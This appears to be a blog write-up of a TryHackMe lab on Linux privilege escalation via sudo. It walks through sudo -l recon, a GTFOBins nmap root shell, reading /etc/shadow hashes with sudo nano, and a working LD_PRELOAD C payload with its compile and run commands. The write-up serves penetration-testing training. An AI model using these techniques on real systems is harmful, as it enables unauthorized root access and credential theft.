---
layout: post
title: THM Linux Privilege Escalation - sudo
subtitle: Misusing sudo
date: 2025-04-05
tags:
  - pentest
  - tryhackme
  - redteam
  - linux
  - privesc
  - sudo
cover-img: /assets/img/sudo-priv-esc.png
thumbnail-img: /assets/img/linux-priv-esc.png
comments: true
mathjax: true
---
# Nature of the Task

In this task the goal is to use use `sudo` in a variety of ways to access information that would normally be out of limits to a low privilege user.

# A bit of `sudo` recon...

The first thing to do is to to run `sudo -l` as the `karen` (low privilege) user to see what's available to us:

```sh
$ sudo -l
Matching Defaults entries for karen on ip-10-10-92-255:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-10-92-255:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
```

We can run 3 programs with `sudo`, namely `find`, `less`, and `nano`.

That answers the first question! Hooray!

# Capture the Flag! `find` and `cat`

The next question is to obtain the contents of `flag2.txt`. We can simply run `find` to locate the file on the system, we don't even need to run it with `sudo`!

```sh
$ find / -name "flag2.txt" 2>/dev/null
/home/ubuntu/flag2.txt
```
We can simply `cat /home/ubuntu/flag2.txt` to obtain our flag. No `sudo` needed!

# GTFOBins! `sudo nmap`

The next question requires a bit of research. *If* we had `sudo` access to `nmap`, how could we leverage this to obtain a `root` shell?

Let's head over to [GTFOBins](https://gtfobins.github.io/) and see what being able to run `nmap` with `sudo` could give us

![namp-search](/assets/img/GTFOBins-nmap-search.png)

Hmmm.... Shell? Sudo? Looks promising!

![nmap-sudo](/assets/img/GTFOBins-nmap-sudo.png)

So, looks like `sudo nmap --interactive` is enough to give us an interactive `root` shell.

# Hashed Passwords

Since we can run `sudo nano` we can simply open `/etc/shadow` and see the hash of Frank's password!

![etc-shadow](/assets/img/nano-etc-shadow-linux-priv-esc.png)

# `LD-PRELOAD`

If our `sudo -l` had found that `env_keep+=LD_PRELOAD` we could have leveraged this to get a root shell. On either the target or our attacking machine, we'd need to compile the following C source code  (`shell.c`):

```c
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}
```

We'd compile with the following parameters:

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

We'd need to get it on the target in a writable directory that we could execute from, and then we'd run it as follows:

```sh
sudo LD_PRELOAD=/home/user/ldpreload/shell.so <any binary we can run with sudo>
```

# Recap and Takeaways

- `sudo -l` is your first stop in any privilege escalation attempt — it reveals what commands can be run as root.
    
- You don’t always need `sudo` to find flags; simple tools like `find` and `cat` still go a long way.
    
- GTFOBins is an essential resource — it tells you exactly how to weaponize `sudo` permissions for common binaries like `nmap`.
    
- Tools like `nano` and `less` may seem harmless, but with `sudo`, they let you read protected files like `/etc/shadow`.
    
- The `LD_PRELOAD` technique is powerful — if environment variables are preserved with `sudo`, it can be used to inject a shared library and pop a root shell.